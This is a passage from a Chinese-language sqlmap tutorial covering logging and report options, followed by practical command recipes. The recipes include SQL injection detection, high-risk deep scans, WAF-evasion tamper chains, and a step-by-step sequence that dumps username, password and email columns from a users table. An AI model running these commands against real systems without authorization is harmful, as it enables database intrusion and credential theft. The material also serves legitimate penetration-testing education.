<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--crawl</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">CRAWLDEPTH</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 从目标URL开始爬取网站深度</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --crawl=2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--crawl-exclude</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 爬取时排除的正则表达式</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--csv-del</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">CSVDEL</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # CSV输出文件的分隔符（默认逗号）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--dump-format</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">DU</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 导出数据格式（CSV, HTML, SQLITE）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--encoding</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">ENCOD</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 用于数据检索的字符编码</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--output-dir</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">OUT</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 自定义输出目录路径</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 默认: ~/.local/share/sqlmap/output</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--save</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SAVECONFIG</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 保存选项到配置文件</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --save=config.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--scope</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SCOPE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 使用正则过滤目标范围</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --scope=&quot;(www\.)?target\.com&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 实用示例</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --crawl=3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --output-dir=/tmp/sqlmap_results</span></span></code></pre></figure>
<h3 id="93-日志记录">9.3 日志记录<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#93-日志记录" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-s</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> SESSIONFILE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 存储会话的SQLite文件</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: -s session.sqlite</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-t</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> TRAFFICFILE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 记录所有HTTP流量到文本文件</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: -t traffic.txt</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--answers</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">ANSWERS</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 预设问题答案（用于批处理）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --answers=&quot;quit=N,follow=Y&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--beep</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                         # 发现SQL注入时发出蜂鸣声</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--dependencies</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 检查SQLMap依赖项是否安装</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--disable-coloring</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 禁用彩色输出</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--list-tampers</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 列出所有可用的tamper脚本</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--no-logging</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                   # 禁用日志记录</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--offline</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                      # 离线模式（仅使用会话数据）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--purge</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                        # 安全删除output目录中的所有内容</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--results-file</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">R</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # CSV格式的多目标结果文件</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--shell</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                        # 提示进入交互式shell</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tmp-dir</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">TMPDIR</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 存储临时文件的本地目录</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--unstable</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 调整不稳定连接的选项</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--update</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 更新SQLMap到最新版本</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--wizard</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 简单向导界面（适合新手）</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 完整日志记录示例</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-v</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 4</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> traffic.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -s</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> session.sqlite</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span></code></pre></figure>
<h3 id="94-报告生成">9.4 报告生成<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#94-报告生成" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 导出HTML格式报告</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> database</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> table</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump-format=HTML</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 导出CSV格式（便于Excel分析）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> database</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> table</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump-format=CSV</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --csv-del=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;;&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 生成SQLite数据库</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> database</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> table</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump-format=SQLITE</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 输出目录结构</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ~/.local/share/sqlmap/output/</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># └── target.com/</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     ├── dump/           # 导出的数据</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     ├── files/          # 读取的文件</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     ├── log             # 日志文件</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     └── session.sqlite  # 会话数据</span></span></code></pre></figure>
<h2 id="十实战案例与技巧">十、实战案例与技巧<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#十实战案例与技巧" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="101-常用命令组合">10.1 常用命令组合<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#101-常用命令组合" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<h4 id="基础检测">基础检测<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#基础检测" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 快速检测（最常用）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/page.php?id=1&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --random-agent</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 带Cookie的检测</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/page.php?id=1&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --cookie=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;PHPSESSID=abc123&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --level=2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># POST参数检测</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/login.php&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --data=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;username=admin&amp;password=123&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 从Burp Suite请求文件检测（推荐）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> request.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --random-agent</span></span></code></pre></figure>
<h4 id="深度检测">深度检测<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#深度检测" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 完整深度扫描</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --level=5</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --risk=3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --random-agent</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试所有参数（包括Cookie、UA等）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --cookie=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;session=xxx&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --level=5</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --risk=2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 指定数据库类型加速</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dbms=MySQL</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --level=3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --risk=2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span></code></pre></figure>
<h4 id="waf绕过">WAF绕过<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#waf绕过" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 基础绕过</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --tamper=space2comment</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --delay=2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 多重绕过技术</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --tamper=space2comment,between,randomcase</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --delay=3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 完整规避方案</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --tamper=space2comment,between</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --delay=2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --proxy=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://127.0.0.1:8080&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --hpp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --batch</span></span></code></pre></figure>
<h4 id="数据获取">数据获取<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#数据获取" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 完整数据获取流程</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 1. 获取所有数据库</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dbs</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 2. 获取指定数据库的所有表</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testdb</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --tables</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 3. 获取指定表的所有列</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testdb</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> users</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --columns</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 4. 导出指定表的数据</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testdb</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> users</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 5. 只导出特定列</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testdb</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> users</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -C</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;username,password,email&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 6. 条件导出</span></span>
